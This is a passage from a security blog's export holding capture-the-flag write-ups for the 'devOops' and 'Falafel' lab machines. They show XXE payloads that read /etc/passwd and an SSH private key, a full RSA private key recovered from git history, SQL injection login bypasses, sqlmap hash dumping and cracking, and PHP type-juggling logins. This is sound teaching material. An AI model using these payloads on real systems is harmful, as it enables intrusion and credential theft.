ssh-hostkey: | 2048 42:90:e3:35:31:8d:8b:86:17:2a:fb:38:90:da:c4:95 (RSA) | 256 b7:b6:dc:c4:4c:87:9b:75:2a:00:89:83:ed:b2:80:31 (ECDSA) |_ 256 d5:2f:19:53:b2:8e:3a:4b:b3:dd:3c:1f:c0:37:0d:00 (ED25519) 5000/tcp open http Gunicorn 19.7.1 |_http-server-header: gunicorn/19.7.1 |_http-title: Site doesn't have a title (text/html; charset=utf-8). Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 17.39 seconds The Home page of the website is shown below. It does not show very interesting information, just the text on the top which can be useful later on. The rest is just an image. The html source does not show anything useful either: Let's scan directories with gobuster : m4rc0ff@SittingDucks:~$ gobuster dir -u http://10.10.10.91:5000 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,html =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.10.91:5000 [+] Threads: 10 [+] Wordlist: /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Extensions: php,html [+] Timeout: 10s =============================================================== 2020/05/29 14:28:40 Starting gobuster =============================================================== /feed (Status: 200) /upload (Status: 200) the page /feed shows only the same image that we saw in the Home page. /upload shows the following: The upload page seems to indicate that it take XML elements. As a test I created an xml file as follwow: m4rc0ff@SittingDucks:~/Documents/htbBoxes/devOops$ cat SittingDucks.xml <?xml version=\"1.0\" encoding=\"UTF-8\"?> <body> <Author> M4rc0ff </Author> <Subject> SittingDucks.io </Subject> <Content> devOops </Content> </body> When I try to upload the file I get this: this proves that we can upload XML files. It also discloses information about a path, /home/roosa/deploy/src which could be where the uploaded files end, and that roosa is a potentially valid user of the box. To prove that roosa is a valid user we can try an XML External Entity attack (XEE) . This kind of attack is performed against applications that parse XML documents and the XML input contains a reference to an External Entity such as SYSTEM . As an example if we want to use this attack to confirm the user roosa exists in the box we can try to read the content of the /etc/passwd file modifying the XML we used before as follow: <?xml version=\"1.0\" encoding=\"UTF-8\"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\" > ]> <body> <Author> M4rc0ff </Author> <Subject> SittingDucks.io </Subject> <Content> &xxe; </Content> </body> As shown above we have defined the xxe parameter entity in our DOCTYPE foo . Once we upload this file to the webserver the XML parser will call the SYSTEM external entity and execute file:///etc/passwd . Once parser, the <Content> tag would contain the content of the /etc/passwd file. To try this out I captured a request with burp and passed it to the repeater, then I send the request and obain this: The above demonstrates that the application is vulnerable to XEE vulnerabilities and we are able to confirm that the user roosa exists and has a valid shell. With this information we can assume that the user roosa is alloewed to login through SSH and that he/she has an SSH private key stored under the default location ( /home/roosa/.ssh/id_rsa ). So we can craft another XEE payload to retrieve the SSH key: It worked, so we can copy the key into a file and use it to login to the box: m4rc0ff@SittingDucks:~/Documents/htbBoxes/devOops$ chmod 600 ssh.key m4rc0ff@SittingDucks:~/Documents/htbBoxes/devOops$ ssh -i ssh.key roosa@10.10.10.91 The authenticity of host '10.10.10.91 (10.10.10.91)' can't be established. ECDSA key fingerprint is SHA256:hbD2D4PdnIVpAFHV8sSAbtM0IlTAIpYZ/nwspIdp4Vg. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added '10.10.10.91' (ECDSA) to the list of known hosts. Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.13.0-37-generic i686) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage 135 packages can be updated. 60 updates are security updates. The programs included with the Ubuntu system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. roosa@gitter:~$ cat user.txt c5****************************7b and indeed I was able to login with that key and get the usert.txt flag. roosa@gitter:~$ ll total 168 drwxr-xr-x 22 roosa roosa 4096 May 30 00:10 ./ drwxr-xr-x 7 root root 4096 Mar 19 2018 ../ -r-------- 1 roosa roosa 5704 Mar 21 2018 .bash_history -rw-r--r-- 1 roosa roosa 220 Mar 19 2018 .bash_logout -rw-r--r-- 1 roosa roosa 3771 Mar 19 2018 .bashrc drwx------ 12 roosa roosa 4096 May 29 12:43 .cache/ drwx------ 3 roosa roosa 4096 Mar 21 2018 .compiz/ drwx------ 14 roosa roosa 4096 Mar 21 2018 .config/ drwx------ 3 root root 4096 Mar 21 2018 .dbus/ drwxrwxr-x 4 roosa roosa 4096 Mar 26 2018 deploy/ drwxr-xr-x 2 roosa roosa 4096 May 29 2018 Desktop/ -rw-r--r-- 1 roosa roosa 25 Mar 21 2018 .dmrc drwxr-xr-x 2 roosa roosa 4096 Mar 21 2018 Documents/ drwxr-xr-x 2 roosa roosa 4096 Mar 21 2018 Downloads/ drwx------ 3 roosa roosa 4096 Mar 20 2018 .emacs.d/ -rw-r--r-- 1 roosa roosa 8980 Mar 19 2018 examples.desktop drwx------ 2 roosa roosa 4096 Mar 26 2018 .gconf/ -rw-rw-r-- 1 roosa roosa 56 Mar 19 2018 .gitconfig drwx------ 3 roosa roosa 4096 May 31 2018 .gnupg/ -rw------- 1 roosa roosa 5100 May 29 2018 .ICEauthority drwx------ 3 roosa roosa 4096 Mar 21 2018 .local/ drwxr-xr-x 2 roosa roosa 4096 Mar 21 2018 Music/ drwxrwxr-x 2 roosa roosa 4096 Mar 19 2018 .nano/ drwxr-xr-x 2 roosa roosa 4096 Mar 21 2018 Pictures/ -rw-r--r-- 1 roosa roosa 655 Mar 19 2018 .profile drwxr-xr-x 2 roosa roosa 4096 Mar 21 2018 Public/ -rwxrw-r-- 1 roosa roosa 147 Mar 26 2018 run-blogfeed.sh* -rw-rw-r-- 1 roosa roosa 1839 Mar 26 2018 service.sh -rw-rw-r-- 1 roosa roosa 2206 Mar 26 2018 service.sh~ drwx------ 2 roosa roosa 4096 Mar 26 2018 .ssh/ -rw-r--r-- 1 roosa roosa 0 Mar 21 2018 .sudo_as_admin_successful drwxr-xr-x 2 roosa roosa 4096 Mar 21 2018 Templates/ -r-------- 1 roosa roosa 33 Mar 26 2018 user.txt drwxr-xr-x 2 roosa roosa 4096 Mar 21 2018 Videos/ -rw-rw-r-- 1 roosa roosa 182 Mar 26 2018 .wget-hsts drwxrwxr-x 3 roosa roosa 4096 Mar 21 2018 work/ -rw------- 1 roosa roosa 205 May 29 2018 .Xauthority -rw------- 1 roosa roosa 1389 May 31 2018 .xsession-errors -rw------- 1 roosa roosa 82 May 24 2018 .xsession-errors.old The ll command above shows there is a bash_history file and I start having a look: <SNIP> ls -altr resources/integration/ rm -Rf resources/integration/auth_credentials.key mv resources/authcredentials.key resources/integration/ git add resources/integration/authcredentials.key git commit -m 'add key for feed integration from tnerprise backend' ls -altr resources/integration/ git push ssh-keygen ös -altr ls .altr ls -altr cat kak cp kak resources/integration/authcredentials.key git add resources/integration/authcredentials.key git commit -m 'reverted accidental commit with proper key' git push <SNIP> The above snippet shows git has been used and some credentials have been reverted. Let's have a look for git repositories in the system: roosa@gitter:~$ find / -type d -name '.git' 2 >/dev/null /home/roosa/work/blogfeed/.git Moving to that repo and running the below command I can see in more details what happened: roosa@gitter:~/work/blogfeed$ git log --name-only --oneline 7ff507d Use Base64 for pickle feed loading src/feed.py src/index.html 26ae6c8 Set PIN to make debugging faster as it will no longer change every time the application code is changed. Remember to remove before production use. run-gunicorn.sh src/feed.py cec54d8 Debug support added to make development more agile. run-gunicorn.sh src/feed.py ca3e768 Blogfeed app, initial version. src/feed.py src/index.html src/upload.html dfebfdf Gunicorn startup script run-gunicorn.sh 33e87c3 reverted accidental commit with proper key resources/integration/authcredentials.key d387abf add key for feed integration from tnerprise backend resources/integration/authcredentials.key 1422e5a Initial commit README.md So after the initial commit (1422e5a), a key was added (commit d387abf) and straight after in another commit (33e87c3) the key was reverted because of a mistake. To read the reverted key we can run the following command: roosa@gitter:~/work/blogfeed$ git diff 1422e5a d387abf diff --git a/resources/integration/authcredentials.key b/resources/integration/authcredentials.key new file mode 100644 index 0000000..44c981f --- /dev/null +++ b/resources/integration/authcredentials.key @@ -0,0 +1,28 @@ +-----BEGIN RSA PRIVATE KEY----- +MIIEogIBAAKCAQEArDvzJ0k7T856dw2pnIrStl0GwoU/WFI+OPQcpOVj9DdSIEde +8PDgpt/tBpY7a/xt3sP5rD7JEuvnpWRLteqKZ8hlCvt+4oP7DqWXoo/hfaUUyU5i +vr+5Ui0nD+YBKyYuiN+4CB8jSQvwOG+LlA3IGAzVf56J0WP9FILH/NwYW2iovTRK +nz1y2vdO3ug94XX8y0bbMR9Mtpj292wNrxmUSQ5glioqrSrwFfevWt/rEgIVmrb+ +CCjeERnxMwaZNFP0SYoiC5HweyXD6ZLgFO4uOVuImILGJyyQJ8u5BI2mc/SHSE0c +F9DmYwbVqRcurk3yAS+jEbXgObupXkDHgIoMCwIDAQABAoIBAFaUuHIKVT+UK2oH +uzjPbIdyEkDc3PAYP+E/jdqy2eFdofJKDocOf9BDhxKlmO968PxoBe25jjjt0AAL +gCfN5I+xZGH19V4HPMCrK6PzskYII3/i4K7FEHMn8ZgDZpj7U69Iz2l9xa4lyzeD +k2X0256DbRv/ZYaWPhX+fGw3dCMWkRs6MoBNVS4wAMmOCiFl3hzHlgIemLMm6QSy +NnTtLPXwkS84KMfZGbnolAiZbHAqhe5cRfV2CVw2U8GaIS3fqV3ioD0qqQjIIPNM +HSRik2J/7Y7OuBRQN+auzFKV7QeLFeROJsLhLaPhstY5QQReQr9oIuTAs9c+oCLa +2fXe3kkCgYEA367aoOTisun9UJ7ObgNZTDPeaXajhWrZbxlSsOeOBp5CK/oLc0RB +GLEKU6HtUuKFvlXdJ22S4/rQb0RiDcU/wOiDzmlCTQJrnLgqzBwNXp+MH6Av9WHG +jwrjv/loHYF0vXUHHRVJmcXzsftZk2aJ29TXud5UMqHovyieb3mZ0pcCgYEAxR41 +IMq2dif3laGnQuYrjQVNFfvwDt1JD1mKNG8OppwTgcPbFO+R3+MqL7lvAhHjWKMw ++XjmkQEZbnmwf1fKuIHW9uD9KxxHqgucNv9ySuMtVPp/QYtjn/ltojR16JNTKqiW +7vSqlsZnT9jR2syvuhhVz4Ei9yA/VYZG2uiCpK0CgYA/UOhz+LYu/MsGoh0+yNXj +Gx+O7NU2s9sedqWQi8sJFo0Wk63gD+b5TUvmBoT+HD7NdNKoEX0t6VZM2KeEzFvS +iD6fE+5/i/rYHs2Gfz5NlY39ecN5ixbAcM2tDrUo/PcFlfXQhrERxRXJQKPHdJP7 +VRFHfKaKuof+bEoEtgATuwKBgC3Ce3bnWEBJuvIjmt6u7EFKj8CgwfPRbxp/INRX +S8Flzil7vCo6C1U8ORjnJVwHpw12pPHlHTFgXfUFjvGhAdCfY7XgOSV+5SwWkec6 +md/EqUtm84/VugTzNH5JS234dYAbrx498jQaTvV8UgtHJSxAZftL8UAJXmqOR3ie +LWXpAoGADMbq4aFzQuUPldxr3thx0KRz9LJUJfrpADAUbxo8zVvbwt4gM2vsXwcz +oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw +LS4O7JPRqVmgZzUUnDiAVuUHWuHGGXpWpz9EGau6dIbQaUUSOEE= +-----END RSA PRIVATE KEY----- If I tried to SSH as root with the above key it initially failed complaining about the key having an invalid format. m4rc0ff@SittingDucks:~/Documents/htbBoxes/dev0ops$ ssh -i auth.key root@10.10.10.91 Load key \"auth.key\": invalid format root@10.10.10.91's password: Just needed to remove the + that prepend each line and then I was able to login and grab the root flag: m4rc0ff@SittingDucks:~/Documents/htbBoxes/dev0ops$ ssh -i auth.key root@10.10.10.91 Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.13.0-37-generic i686) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage 135 packages can be updated. 60 updates are security updates. Last login: Sat May 30 01:32:23 2020 from 10.10.14.15 root@gitter:~# cat root.txt d4****************************b3","tags":"blogging","loc":"https://sittingducks.io/devOops.html","title":"devOops"},{"url":"https://sittingducks.io/Falafel.html","text":"I liked this box. Although I suspected for SQL injections, sqlmap did not produce any results and this is where I got stuck mostly. Anyway when you get stuck is where you learn most in my opinion as you start doing a lot of research, and once you get it is difficult to forget! I also loved the PHP Juggling vulnerability which is not straightforward to catch if you never knew about it. Recon m4rc0ff@SittingDucks:~$ nmap -p- -sC -sV 10 .10.10.73 Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-26 11:10 BST Nmap scan report for 10.10.10.73 Host is up (0.097s latency). Not shown: 65527 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 36:c0:0a:26:43:f8:ce:a8:2c:0d:19:21:10:a6:a8:e7 (RSA) | 256 cb:20:fd:ff:a8:80:f2:a2:4b:2b:bb:e1:76:98:d0:fb (ECDSA) |_ 256 c4:79:2b:b6:a9:b7:17:4c:07:40:f3:e5:7c:1a:e9:dd (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) | http-robots.txt: 1 disallowed entry |_/*.txt |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Falafel Lovers 6242/tcp filtered jeol-nsdtp-2 34240/tcp filtered unknown 36441/tcp filtered unknown 38674/tcp filtered unknown 48342/tcp filtered unknown 50840/tcp filtered unknown Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 1325.28 seconds nmap shows there is a webserver which host the following website: there is also a login page: The page source does not show anything unusual, but it's clear with a dealing with a PHP website. nmap indicates there is a robots.txt but it only shows the following: User-agent: * Disallow: /*.txt It's time to scan for directories and files with gobuster : m4rc0ff@SittingDucks:~$ gobuster dir -u http://10.10.10.73 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 20 =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.10.73 [+] Threads: 20 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Extensions: txt,php,html [+] Timeout: 10s =============================================================== 2020/05/27 04:27:28 Starting gobuster =============================================================== /images (Status: 301) /index.php (Status: 200) /login.php (Status: 200) /profile.php (Status: 302) /uploads (Status: 301) /header.php (Status: 200) /assets (Status: 301) /footer.php (Status: 200) /upload.php (Status: 302) /css (Status: 301) /style.php (Status: 200) /js (Status: 301) /logout.php (Status: 302) /robots.txt (Status: 200) /cyberlaw.txt (Status: 200) /connection.php (Status: 200) /server-status (Status: 403) =============================================================== 2020/05/27 05:42:56 Finished =============================================================== the /cyberlaw.txt file shows the following: This is a very interesting piece of information. The fact that the user chris managed to get access without password may suggest that there is some kind of vulnerability. I started playing a bit with the login page. I tried to login with a random user and password and I got the message \"Try again..\" but if I try to login with admin and a random password I got the message \"Wrong identification : admin\". This suggests admin could be a valid user. The same behavior happens if I try with the user chris , I got the message \"Wrong identification : chris\" . I used burp to capture a login request and this is what I get: POST /login.php HTTP/1.1 Host: 10.10.10.73 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://10.10.10.73/login.php Content-Type: application/x-www-form-urlencoded Content-Length: 32 Connection: close Cookie: PHPSESSID=bn0re9ksjlkav2k7rn1a206kk7 Upgrade-Insecure-Requests: 1 username=admin&password=test123!! I am pretty confident admin and chris are valid users but we can use WFUZZ to confirm that and to find other potential users. We can use the POST request we found earlier, we just need to replace the user field with the word FUZZ so that the tool can do its job: m4rc0ff@SittingDucks:~$ wfuzz -c -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -d \"username=FUZZ&password=test123wfuzz --help\" -u http://10.10.10.73/login.php ******************************************************** * Wfuzz 2.4.5 - The Web Fuzzer * ******************************************************** Target: http://10.10.10.73/login.php Total requests: 10164 =================================================================== ID Response Lines Word Chars Payload =================================================================== 000000009: 200 102 L 657 W 7074 Ch \"abahri\" 000000002: 200 102 L 657 W 7074 Ch \"aaren\" 000000004: 200 102 L 657 W 7074 Ch \"aaron\" 000000005: 200 102 L 657 W 7074 Ch \"aartjan\" 000000006: 200 102 L 657 W 7074 Ch \"aarushi\" 000000007: 200 102 L 657 W 7074 Ch \"abagael\" 000000008: 200 102 L 657 W 7074 Ch \"abagail\" 000000010: 200 102 L 657 W 7074 Ch \"abbas\" <SNIP> Once WFUZZ starts it makes several requests to the login page using the users in the wordlist provided (I used this one ). From the above output we can see the number of chars of the response is 7074. We can filter this out by adding --hh 7074 in the command so that we will get only ouput that differs from that: m4rc0ff@SittingDucks:~$ wfuzz -c -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -d \"username=FUZZ&password=test123wfuzz --help\" -u http://10.10.10.73/login.php --hh 7074 ******************************************************** * Wfuzz 2.4.5 - The Web Fuzzer * ******************************************************** Target: http://10.10.10.73/login.php Total requests: 10164 =================================================================== ID Response Lines Word Chars Payload =================================================================== 000000086: 200 102 L 659 W 7091 Ch \"admin\" 000001883: 200 102 L 659 W 7091 Ch \"chris\" Total time: 127.0397 Processed Requests: 10164 Filtered Requests: 10162 Requests/sec.: 80.00645 After some time we got the result that confirmed that admin and chris are valid users. Since we know the user chris managed to get access without password, maybe there is an sql injection login bypass vulnerability so let's check that. A good resource can be found here After few tries I got something with test' or '1'='1 . In fact, when I add this in the username field and I use a random password I get the message \"Wrong identification: admin\" . So even if we haven't used admin in the query we still get this result. Question is Why? I think when the user tries to login with username and password the request gets to the server and the latter first verifies the user exists with an SQL query. If the user exists then it checks if the password is correct with another SQL query. When we use the string ' or '1'='1 in the username field, a query similar to this will be initiated: select username from users where username like 'test' or '1' = '1' The first part is FALSE because the user test does not exist but the second part (1=1) is always TRUE! So because the condition is TRUE the server thinks the user exists and throws the error message \"Wrong identification: admin\". But why admin and not chris ? I think most likely because admin is the first user in the table, I don't see other reasons. Now we know for sure we have an SQLi so we can use sqlmap to exploit it. Because first the web server checks if the user exists, if we simply run sqlmap with standard parameters it won't find anything. In fact, when I tried it I got the message: [09:20:41] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent' To bypass the user check we can use the --string option passing the string to match when the query is evaluated to true. This is from the sqlmap man page: --string=STRING String to match when query is evaluated to True Note that I included the login POST request into a file, that is post.req : m4rc0ff@SittingDucks:~$ sqlmap -r Documents/htbBoxes/falafel/post.req --level 5 --risk 3 --batch -p username --string \"Wrong identification\" ___ __H__ ___ ___[(]_____ ___ ___ {1.4.5#stable} |_ -| . [)] | .'| . | |___|_ [\"]_|_|_|__,| _| |_|V... |_| http://sqlmap.org [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program [*] starting @ 06:46:20 /2020-05-28/ [06:46:20] [INFO] parsing HTTP request from 'Documents/htbBoxes/falafel/post.req' [06:46:20] [INFO] resuming back-end DBMS 'mysql' [06:46:20] [INFO] testing connection to the target URL [06:46:20] [INFO] testing if the provided string is within the target URL page content sqlmap resumed the following injection point(s) from stored session: --- Parameter: username (POST) Type: boolean-based blind Title: AND boolean-based blind - WHERE or HAVING clause Payload: username=admin' AND 4880=4880-- feEp&password=password --- [06:46:20] [INFO] the back-end DBMS is MySQL back-end DBMS: MySQL 5 [06:46:20] [INFO] fetched data logged to text files under '/home/m4rc0ff/.sqlmap/output/10.10.10.73' [*] ending @ 06:46:20 /2020-05-28/ So we got a hit with sqlmap , let's now dump the details by adding the --dump option: m4rc0ff@SittingDucks:~$ sqlmap -r Documents/htbBoxes/falafel/post.req --level 5 --risk 3 --batch -p username --string \"Wrong identification\" --dump ___ __H__ ___ ___[,]_____ ___ ___ {1.4.5#stable} |_ -| . [)] | .'| . | |___|_ [.]_|_|_|__,| _| |_|V... |_| http://sqlmap.org [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program [*] starting @ 07:07:34 /2020-05-28/ [07:07:34] [INFO] parsing HTTP request from 'Documents/htbBoxes/falafel/post.req' [07:07:34] [INFO] resuming back-end DBMS 'mysql' [07:07:34] [INFO] testing connection to the target URL [07:07:34] [INFO] testing if the provided string is within the target URL page content sqlmap resumed the following injection point(s) from stored session: --- Parameter: username (POST) Type: boolean-based blind Title: AND boolean-based blind - WHERE or HAVING clause Payload: username=admin' AND 4880=4880-- feEp&password=password --- [07:07:34] [INFO] the back-end DBMS is MySQL back-end DBMS: MySQL 5 [07:07:34] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries [07:07:34] [INFO] fetching current database [07:07:34] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval [07:07:34] [INFO] retrieved: falafel [07:07:39] [INFO] fetching tables for database: 'falafel' [07:07:39] [INFO] fetching number of tables for database 'falafel' [07:07:39] [INFO] retrieved: 1 [07:07:40] [INFO] retrieved: users [07:07:43] [INFO] fetching columns for table 'users' in database 'falafel' [07:07:43] [INFO] retrieved: 4 [07:07:44] [INFO] retrieved: ID [07:07:45] [INFO] retrieved: username [07:07:51] [INFO] retrieved: password [07:07:56] [INFO] retrieved: role [07:07:59] [INFO] fetching entries for table 'users' in database 'falafel' [07:07:59] [INFO] fetching number of entries for table 'users' in database 'falafel' [07:07:59] [INFO] retrieved: 2 [07:07:59] [INFO] retrieved: 1 [07:08:00] [INFO] retrieved: 0e462096931906507119562988736854 [07:08:24] [INFO] retrieved: admin [07:08:27] [INFO] retrieved: admin [07:08:31] [INFO] retrieved: 2 [07:08:32] [INFO] retrieved: d4ee02a22fc872e36d9e3751ba72ddc8 [07:09:02] [INFO] retrieved: normal [07:09:06] [INFO] retrieved: chris [07:09:09] [INFO] recognized possible password hashes in column '`password`' do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N do you want to crack them via a dictionary-based attack? [Y/n/q] Y [07:09:09] [INFO] using hash method 'md5_generic_passwd' what dictionary do you want to use? [1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter) [2] custom dictionary file [3] file with list of dictionary files > 1 [07:09:09] [INFO] using default dictionary do you want to use common password suffixes? (slow!) [y/N] N [07:09:09] [INFO] starting dictionary-based cracking (md5_generic_passwd) [07:09:09] [INFO] starting 2 processes [07:09:18] [INFO] cracked password 'juggling' for user 'chris' Database: falafel Table: users [2 entries] +------+--------+----------+---------------------------------------------+ | ID | role | username | password | +------+--------+----------+---------------------------------------------+ | 1 | admin | admin | 0e462096931906507119562988736854 | | 2 | normal | chris | d4ee02a22fc872e36d9e3751ba72ddc8 (juggling) | +------+--------+----------+---------------------------------------------+ [07:09:24] [INFO] table 'falafel.users' dumped to CSV file '/home/m4rc0ff/.sqlmap/output/10.10.10.73/dump/falafel/users.csv' [07:09:24] [INFO] fetched data logged to text files under '/home/m4rc0ff/.sqlmap/output/10.10.10.73' [*] ending @ 07:09:24 /2020-05-28/ and from the output above we can see sqlmap found the user admin with its hash but the hash was not cracked, whereas it found the user chris with the cracked hash. That being said, I am now able to login to the website with chris credentials: I had a look around but both the webpage and its source do not contain anything interesting, seems like a rabbit hole. I tried cracking the admin hash with hashcat and also using some online hash cracking websites but I was not successful. Eventually, the hint was the word \"juggling\", but I would not have found out without having a peek at Ippsec Falafel video , this is what I do when I am stuck. So a little explanation about the PHP type Juggling is needed. PHP provides two ways to compare two variables: Loose Comparison using == or != Strict Comparison using === or !== Good reference examples can be found here and here . To give a more practical example, Loose Comparison works like this: m4rc0ff@SittingDucks:~$ php -a Interactive mode enabled php > echo 'twentieth' + 4; PHP Warning: A non-numeric value encountered in php shell code on line 1 4 php > echo '20th' + 4; PHP Notice: A non well formed numeric value encountered in php shell code on line 1 24 The above happens because in loose comparisons when a string starts with a number, PHP pulls that number out and use it at the value for the mathematical operation. Now this can be useful in specific use cases but can be dangerous in other. In our specific case, the admin password hash starts with 0e : 0e462096931906507119562988736854 In loose comparisons when something starts with 0e and is followed by numbers, PHP interpretes it as 0 to the power of the number that follow. In the case of 0e462096931906507119562988736854 PGP interpretes it at 0 to the power ( e ) of 462096931906507119562988736854 , that is always going to equal to 0 . Because of this we can have \"hash collisions\", that is any password for which its hash starts with 0e would be valid for us to login. So I picked up a random MD5 hash that starts with 0e from this website : password: KXsU0AZ2PtRe hash: 0e448778299130864449509797129898 and with that password I was able to login in the website as admin. To be fair I tried few more of that list and I was always able to login. To avoid this issue Strict Comparison must be used. Once logged in as admin I can see this: I then start a python SimpleHttp server in my kali box on a directory where I have a png file named falafel.png , and I insert the URL of the png ( http://10.10.14.15/falafel.png ) in the upload box. Once I click on upload I get this output: The highlighted string shows that the web server is using wget to download the image I provided. At this stage I tried many few PHP file upload bypass techniques to upload a small shell: renamed the shell as shell.php.png embedded the shell within the image comments with exiftool change content-type to gif and start content with GIF89a however none of these worked. Then I went to the profile page and noticed this: As the per Juggling, this was another hint. In fact, this refers to the fact that wget cannot accept a file with more than 255 characters. To prove this, I create a random 255 characters long pattern: m4rc0ff@SittingDucks:~/Documents/htbBoxes/falafel$ msf-pattern_create -l 255 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 Then I try to create a file with that pattern with the png extension: m4rc0ff@SittingDucks:~/Documents/htbBoxes/falafel$ touch Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4.png touch: cannot touch 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4.png': File name too long as expected we receive a message that the file name is too long because by adding .png I added 4 additional characters to the allowed limit. So let's remove the 4 characters before .png , then we have: m4rc0ff@SittingDucks:~/Documents/htbBoxes/falafel$ touch Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai.png m4rc0ff@SittingDucks:~/Documents/htbBoxes/falafel$ ll total 308 -rw-r--r-- 1 m4rc0ff m4rc0ff 0 May 29 06:18 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai.png The file was created with no errors! When I try to upload this new long file I get 